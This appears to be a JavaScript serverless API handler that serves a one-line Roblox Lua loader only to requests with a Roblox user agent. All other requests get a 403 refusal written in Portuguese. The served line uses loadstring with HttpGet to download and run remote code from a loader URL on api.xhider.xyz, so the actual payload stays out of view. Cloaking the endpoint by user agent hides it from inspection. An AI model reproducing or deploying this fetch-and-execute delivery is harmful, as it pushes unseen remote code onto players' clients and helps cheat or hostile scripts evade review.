export default function handler(req, res) {
  const userAgent = req.headers["user-agent"] || "";

  if (!userAgent.toLowerCase().includes("roblox")) {
    return res.status(403).send("Acesso permitido somente pelo Roblox.");
  }

  const script = `
loadstring(game:HttpGet'https://api.xhider.xyz/files/v4/loaders/8f32f6be6e47a7bc31b69fd9bd545aec.lua')()
`;

  res.setHeader("Content-Type", "text/plain");
  res.status(200).send(script);
}
